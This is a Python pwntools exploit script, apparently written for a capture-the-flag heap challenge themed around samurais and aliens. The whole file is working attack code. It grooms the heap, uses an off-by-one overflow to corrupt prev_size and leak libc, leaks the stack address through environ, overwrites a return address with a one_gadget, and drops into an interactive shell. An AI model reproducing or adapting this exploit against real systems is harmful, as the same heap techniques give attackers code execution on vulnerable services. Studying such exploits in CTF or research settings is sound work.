import argparse
import random
from pwn import *

parser = argparse.ArgumentParser()

parser.add_argument('-d', '--debugger', action='store_true')
parser.add_argument('-p', '--port')
parser.add_argument('-r', '--remote')
parser.add_argument('-e', '--elf')
parser.add_argument('-b', '--binary')
args = parser.parse_args()

context.terminal = '/bin/bash'
context.log_level = 'debug' # this is a brute wew
# context.binary = args.binary # this just hangs???


p = None # this is global process variable
e = None
b = None

if args.elf:
  e = ELF(args.elf)

if args.remote:
  p = remote(args.remote, args.port) # TODO: add a remote service URI here
elif args.binary:
  p = process(args.binary)
else:
  parser.print_help()
  exit()
if args.debugger:
  if args.remote:
    print("You can't attach a debugger to a remote process")
  else:
    gdb.attach(p) # if in vagrant just run gdb and attach it.


# TODO: Setup enough samurais to beat the final alien

def create_sam():
  p.recvuntil('ka?\n')
  p.sendline(str(1))
  p.recvuntil('name?\n')
  p.sendline('A' * 0x8)

def kill_sam(index):
  p.recvuntil('ka?\n')
  p.sendline(str(2))
  p.recvuntil('daimyo?\n')
  p.sendline(str(index))

SAMURAIS = 40
for i in range(SAMURAIS):
  create_sam()

# we make room for aliens in the heap to exist.
unkillable = [3, 4, 6, 7, 9, 13, 14, 16]
for i in range(9 + len(unkillable)):
  if i in unkillable: continue
  kill_sam(i)

p.recvuntil('ka?\n')
p.sendline(str(3))

# TODO: Alien => alien => libc leak
def create_alien(size, data):
  p.recvuntil('today.\n')
  p.sendline(str(1))
  p.recvuntil('name?\n')
  p.sendline(str(size))
  p.recvuntil('name?\n')
  p.send(data)

def kill_alien(index):
  p.recvuntil('today.\n')
  p.sendline(str(2))
  p.recvuntil('mother?\n')
  p.sendline(str(index))

def rename_alien(index, data):
  p.recvuntil('today.\n')
  p.sendline(str(3))
  p.recvuntil('rename?\n')
  p.sendline(str(index))
  p.recvuntil('to?')
  p.send(data)

create_alien(0xf8, 'A' * 0xf7) # 0 killed
create_alien(0x200, 'B' * 0x1f0 + p64(0x210)[:-1]) # 1 killed
create_alien(0xf8, 'C' * 0xf7) # 2 killed
create_alien(0xf8, 'D' * 0xf7) #3


kill_alien(0) # kill and overwrite to overflow
kill_alien(1)
create_alien(0xf8, 'E' * 0xf8) # 4 => overflows and misaligns C's prev_size field.

create_alien(0xf8, 'F' * 0xf7) # 5 killed
create_alien(0x80, 'G' * 0x7f) # 6

kill_alien(5)
kill_alien(2)

create_alien(0xf8, 'H' * 0xf7) # 7
create_alien(0x80, 'I' * 0x79) # 8 killed
kill_alien(8)

p.recvuntil('today.\n')
p.sendline(str(3))
p.recvuntil('rename?\n')
p.sendline(str(6)) # rename the libc leak
p.recvuntil('rename ')
leak = p.recvuntil('to?\n')
leak = leak.strip(' to?\n')
leak = u64(leak + '\x00' * (8 - len(leak)))
print('LEAK: ' + hex(leak))
print(hex(e.symbols['puts']))
main_arena_plus_88 = 0x3c4b78
libc_base = leak - main_arena_plus_88
free_hook = libc_base + e.symbols['__free_hook']
environ = libc_base + e.symbols['environ']
one_gadget = libc_base + 0x45216

p.send(p64(leak)[:-1])


create_alien(0x200, 'J' * 0xf7) # 9 to reset the heap
create_alien(0xf8, 'a' * 0xf7) # 10 killed
create_alien(0x200, 'b' * 0x1f0 + p64(0x210)[:-1]) # 11 killed
create_alien(0xf8, 'c' * 0xf7) # 12 killed
create_alien(0xf8, 'd' * 0xf7) #13


kill_alien(10) # kill and overwrite to overflow
kill_alien(11)
create_alien(0xf8, 'e' * 0xf8) # 14 => overflows and misaligns C's prev_size field.

create_alien(0xf8, 'f' * 0xf7) # 15 killed
create_alien(0x200, 'g' * 0x1ff) # 16 this will be stuck into the "modified" position DO NOT KILL

kill_alien(15)
kill_alien(12)

payload = 'h' * 0xf8
payload += p64(0x21)
payload += p64(environ)
payload += p64(0x9)[:-1]

create_alien(len(payload) + 1, payload) # 17

p.recvuntil('today.\n')
p.sendline(str(3))
p.recvuntil('rename?\n')
p.sendline(str(16))
p.recvuntil('rename\x20')
leak = p.recvuntil(' to?\n')
leak = leak.strip(' to?\n')
stack_leak = u64(leak + '\x00' * (8 - len(leak)))

p.send(p64(stack_leak)[:-1])
print('Environ: ' + hex(stack_leak))

kill_alien(17)

ret_offset = -336
print("Return address overwrite:" + hex(stack_leak + ret_offset))

payload = 'h' * 0xf8
payload += p64(0x21)
payload += p64(stack_leak + ret_offset)
payload += p64(0x9)[:-1]
create_alien(len(payload) + 1, payload) # 18 in 17's place

rename_alien(16, p64(one_gadget)[:-1])

# print("Puts (for reference): " + hex(libc_base + e.symbols['puts']))
# print('Free hook: ' + hex(free_hook))
# print('One Gadget: ' + hex(one_gadget))
# pause()

p.interactive()
